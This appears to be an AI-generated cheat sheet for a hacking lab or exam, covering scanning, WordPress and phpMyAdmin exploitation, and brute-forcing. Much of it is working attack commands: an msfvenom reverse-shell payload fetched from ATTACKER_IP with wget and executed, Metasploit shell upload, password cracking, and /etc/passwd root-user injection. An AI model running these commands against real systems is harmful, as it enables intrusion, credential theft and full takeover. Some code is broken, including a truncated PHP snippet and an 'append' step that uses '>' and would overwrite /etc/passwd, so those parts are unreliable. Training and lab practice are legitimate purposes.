<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" class="logo" width="120"/>

## Ethical Hacking Guide: Gaining Access \& Reverse Shell

### Phase 1: Initial Setup \& Reconnaissance

1. **Environment Access:** Connect to the relevant lab or testing environment (e.g., using VNC or SSH).
2. **Identify IP Addresses:**
    * Find your attacker machine's IP: Run `ip a` on your machine (often under an interface like `eth0` or `ens18`). Note this as `<ATTACKER_IP>`.
    * Identify the target machine's IP. Note this as `<TARGET_IP>`.
3. **Basic Connectivity Check:**
    * Verify the target is reachable: `ping <TARGET_IP>`. Note that ICMP (ping) might be blocked, so a failed ping doesn't always mean the host is down.
4. **Port and Service Scanning (Nmap):**
    * Scan for open ports and service versions: `sudo nmap -sS -sV <TARGET_IP>`.
        * `-sS`: SYN Scan (stealthy and efficient TCP scan).
        * `-sV`: Detects service versions running on open ports.
    * If ping fails (host discovery skipped): `sudo nmap -Pn -sS -sV <TARGET_IP>` (`-Pn` assumes the host is up).
    * For a comprehensive scan (takes longer): `sudo nmap -sS -sV -p- <TARGET_IP>` (scans all 65535 TCP ports).
    * Note open ports (e.g., 80/HTTP, 443/HTTPS, 22/SSH, 21/FTP) and the identified service versions.

### Phase 2: Web Enumeration \& Vulnerability Identification

If web services (e.g., Port 80/443) are found:

1. **Directory \& File Discovery:**
    * Use `dirb` to find hidden web content: `dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt`. Ensure you have the specified wordlist (`common.txt`).
    * Alternatively, use GUI tools like `dirbuster`, setting the target URL, choosing a wordlist, and disabling recursion initially.
    * Look for interesting paths like `/admin`, `/login`, `/phpmyadmin`, `/wordpress`, config files, etc.
2. **Specific Application Scanning:**
    * **WordPress:** If detected, use `wpscan` for detailed enumeration: `sudo wpscan --url http://<TARGET_IP>/[path_to_wordpress] -e ap,at,u` (enumerates All Plugins, All Themes, Users). Note the versions of WordPress core, themes, and plugins.
    * **PHPMyAdmin:** If found, try to identify the version. Check the page source code (look for `?v=X.Y.Z`) or the page display itself. Note the path (e.g., `/phpmyadmin`).
3. **Vulnerability Research (Exploit-DB):**
    * Visit `exploit-db.com`.
    * Search for vulnerabilities based on the software and versions identified (e.g., "phpmyadmin 4.8.1", "wordpress plugin Slider Revolution 5.4.6.3").
    * Focus on **Remote Code Execution (RCE)** vulnerabilities.
    * Prioritize **verified** exploits (often indicated by a checkmark).
    * Download potential exploit scripts (commonly Python `.py` or Ruby `.rb`).

### Phase 3: Exploitation \& Initial Access

Choose your path based on vulnerabilities found:

**Scenario A: PHPMyAdmin RCE**

1. Find a verified RCE exploit on Exploit-DB matching the target version.
2. Download the exploit script (e.g., `pma.py`).
3. Use the script to gain command execution. The syntax often requires target IP, port, path, credentials (try defaults like `pma:pmapass` if unknown), and the command to execute.
    * Test with a simple command first: `python3 pma.py <TARGET_IP> 80 /phpmyadmin pma pmapass 'whoami'`.
4. If successful, use this command execution capability for Phase 4 (Establishing Reverse Shell).

**Scenario B: WordPress Exploitation**

* **Option 1: Vulnerable Plugin/Theme**

1. Find a suitable exploit on Exploit-DB based on `wpscan` findings.
2. Download and run the exploit script according to its instructions (e.g., `python3 exploit.py http://<TARGET_IP>/wordpress`).
3. If it grants RCE or allows file upload, proceed to Phase 4.
* **Option 2: Brute-Force Credentials**

1. If usernames were found (e.g., `admin` via `wpscan`), attempt password brute-forcing: `wpscan --url http://<TARGET_IP>/[path] --usernames <USERNAME> --passwords /usr/share/wordlists/rockyou.txt`. (Ensure you have `rockyou.txt`; exam passwords might be common ones found early in the list).
2. If successful (e.g., `admin:password123`), log in to the WordPress admin panel (`/wp-admin`).
* **Option 3: Metasploit (Admin Access Required)**

1. Launch Metasploit: `msfconsole`.
2. Search for a relevant exploit, like admin shell upload: `search wordpress shell upload` or `search wp_admin_shell_upload`.
3. Use the exploit: `use exploit/unix/webapp/wp_admin_shell_upload`.
4. Check required settings: `options`.
5. Set parameters:

```
set RHOSTS <TARGET_IP>
set USERNAME <WP_ADMIN_USER>
set PASSWORD <WP_ADMIN_PASS>
set TARGETURI /[path_to_wordpress]/  # Adjust path if needed
set LHOST <ATTACKER_IP>             # Your IP for the reverse shell
set LPORT <LISTENING_PORT>          # e.g., 4445 (different from nc listener later)
```

6. Run the exploit: `run` or `exploit`.
7. This may give a Meterpreter shell (type `shell` to get a standard shell) or a standard shell directly. Proceed to Phase 5 (Shell Upgrade) if you get a standard shell here.
* **Option 4: Manual Theme Edit (Admin Access Required)**

1. Navigate to Appearance -> Theme Editor.
2. Find an editable PHP file (e.g., `comments.php`, `404.php`).
3. Carefully replace its content with PHP code to execute commands or a PHP reverse shell (see Phase 4, Step 3b).
4. Trigger the code by visiting the relevant page/feature. Proceed to Phase 4.

**Scenario C: Basic Authentication**

1. If a directory requires HTTP Basic Authentication (e.g., found via `dirb`).
2. Identify potential usernames (e.g., `admin`).
3. Use `hydra` to brute-force the password (specific syntax not provided in notes).
4. If credentials (`<USERNAME>:<PASSWORD>`) are found, access the protected area. You might find file uploads or other vulnerabilities. Use credentials with `dirb` for further scans: `dirb http://<TARGET_IP>/protected_dir/ -u <USERNAME>:<PASSWORD>`. Proceed based on findings.

**Scenario D: General File Upload / LFI / RCE**

1. If a file upload feature is found, attempt to upload a web shell (e.g., PHP shell).
2. If Local File Inclusion (LFI) is found, try reading sensitive files or potentially combining it with other vulns for code execution.
3. If any other mechanism provides command execution, use it for Phase 4.

### Phase 4: Establishing Reverse Shell (via Command Execution)

This common technique ("CMD Shell") uses existing command execution to get a reverse shell connecting back to your machine.

1. **Prepare Listener (Attacker - Terminal 1):**
    * Choose an unused port (e.g., 4444). Let's call this `<LISTENER_PORT>`.
    * Start a netcat listener: `nc -lvnp <LISTENER_PORT>`. Keep this running.
2. **Generate Payload (Attacker):**
    * Use `msfvenom` to create a stageless executable shell payload (works well with `nc`).
    * For Linux x64 target:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTENER_PORT> -f elf > shell.elf`. (Adjust `-p` for architecture (e.g., `linux/x86/...`) or OS if needed).
    * Note the output filename (e.g., `shell.elf`). Use a new name if repeating to avoid caching (`shell_v2.elf`).
3. **Serve Payload (Attacker - Terminal 2):**
    * Navigate to the directory where `shell.elf` was saved.
    * Start a simple web server: `python3 -m http.server 8000` (or another port, e.g., 8001). Note this server port (`<HTTP_PORT>`). Keep this running.
4. **Trigger Execution (Target - via vulnerability):**
    * Use your command execution vulnerability (from Phase 3) to make the target download, permit execution, and run the payload. A common writable location is `/tmp`.
    * Combined command string:
`cd /tmp; rm -f shell.elf; wget http://<ATTACKER_IP>:<HTTP_PORT>/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf`.
        * *Breakdown:* Change directory, remove old file (optional), download payload using `wget`, make it executable (`chmod +x` or `777`), run it.
        * *Alternatives:* If `wget` isn't available, try `curl -o shell.elf http://<ATTACKER_IP>:<HTTP_PORT>/shell.elf`. Ensure filename, attacker IP, and HTTP port match.
    * **Example using PHPMyAdmin exploit script:**
`python3 pma.py <TARGET_IP> 80 /phpmyadmin pma pmapass 'cd /tmp; rm -f shell.elf; wget http://<ATTACKER_IP>:<HTTP_PORT>/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf'`.
    * **Example using PHP `exec` (e.g., via WordPress theme edit):**

```php
:<HTTP_PORT>/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf"); ?>
```


Trigger by accessing the modified page.
5.  **Check Connection:**
*   Your Python web server (Terminal 2) should log a request for `shell.elf` (HTTP 200).
*   Your `nc` listener (Terminal 1) should show a "connect to [...] from [...]" message and provide a command prompt (`$` or `#`). You now have a shell.

### Phase 5: Shell Interaction \& Upgrade

1. **Initial Shell:** You likely have a basic, non-interactive shell (e.g., `/bin/sh`). Test with `id`, `whoami`.
2. **Upgrade to Interactive Shell:** Use Python (if available on target) for a better experience (tab completion, history, interactive commands like `sudo`).
`python3 -c 'import pty; pty.spawn("/bin/bash")'`.
    * If `python3` fails, try `python`. If `/bin/bash` fails, try `/bin/sh`.

### Phase 6: Privilege Escalation (Quick Reference)

Once initial access is gained, the next step is often to escalate privileges to root.

* **Check `sudo` permissions:** `sudo -l` (See if your user can run commands as root, possibly without a password).
* **Find SUID/SGID binaries:** `find / -perm -u=s -type f 2>/dev/null` (Look for binaries owned by root that execute with root privileges). Check GTFOBins website for exploitation methods.
* **Check File Permissions:**
    * Examine sensitive files: `ls -l /etc/passwd /etc/shadow`.
    * Check Access Control Lists: `getfacl /etc/passwd /etc/shadow`.
    * **If `/etc/passwd` is world-writable:**

1. Generate a password hash *on your attacker machine*: `openssl passwd -1 -salt xyz mynewpassword`.
2. Append a new root user entry to the target's `/etc/passwd`: `echo 'newroot:<GENERATED_HASH>:0:0:root:/root:/bin/bash' > /etc/passwd`.
3. Switch user: `su newroot` (enter `mynewpassword`).
* **Look for Credentials:**
    * Check SSH keys: `ls -la /home/*/.ssh/` (Look for private keys like `id_rsa`).
    * Search config files, scripts, history files.
* **Crack Found Hashes:**
    * If you find password hashes (e.g., in `/etc/shadow`, database dumps).
    * Save them to a file (e.g., `hashes.txt`) in the correct format (e.g., `username:<hash_string>:$id$salt...`).
    * Use `john` (John the Ripper) with a wordlist: `sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hashes.txt` (Adjust `--format` based on hash type, e.g., `md5`, `sha512crypt`).
    * If cracked, use `su <username>`.
* **Check Processes/Cron Jobs:** Look for processes running as root or scheduled tasks (`cron`) that might use insecure scripts or configurations you can modify.
* **Use Enumeration Scripts:** Tools like LinPEAS (`linpeas.sh`) or WinPEAS automate many privilege escalation checks.


### Important Considerations \& Cheatsheet

* **IP Addresses:** Always confirm your `<ATTACKER_IP>` and the `<TARGET_IP>`.
* **Wordlists:** Have necessary wordlists available, such as `/usr/share/wordlists/dirb/common.txt` and `/usr/share/wordlists/rockyou.txt`.
* **File Naming:** When re-uploading modified files (like shells), use a new filename (e.g., `shell_v2.php`) to avoid browser or server caching issues.
* **Target Directory:** Use writable directories like `/tmp` on the target for downloaded payloads.
* **Exploit Reliability:** Prioritize "verified" exploits from trusted sources like Exploit-DB for better success rates.

**Command Quick Reference:**

* **IP:** `ip a`
* **Ping:** `ping <IP>`
* **Nmap:** `sudo nmap -sS -sV <IP>`, `sudo nmap -Pn -sS -sV <IP>`
* **Dirb:** `dirb http://<IP> <wordlist>`
* **Wpscan:** `sudo wpscan --url <URL> -e ap,at,u`, `wpscan ... --usernames <user> --passwords <wordlist>`
* **Metasploit:** `msfconsole`, `search <term>`, `use <exploit>`, `options`, `set <option> <value>`, `run`
* **Msfvenom:** `msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> > <outfile>`
* **Netcat Listener:** `nc -lvnp <port>`
* **Python Web Server:** `python3 -m http.server <port>`
* **Payload Execution (Target):** `cd /tmp; wget http://<IP>:<port>/<file>; chmod +x <file>; ./<file>`
* **Shell Upgrade:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`
* **Sudo Check:** `sudo -l`
* **SUID Check:** `find / -perm -u=s -type f 2>/dev/null`
* **John the Ripper:** `john --wordlist=<list> --format=<fmt> <hashfile>`

<div style="text-align: center">⁂</div>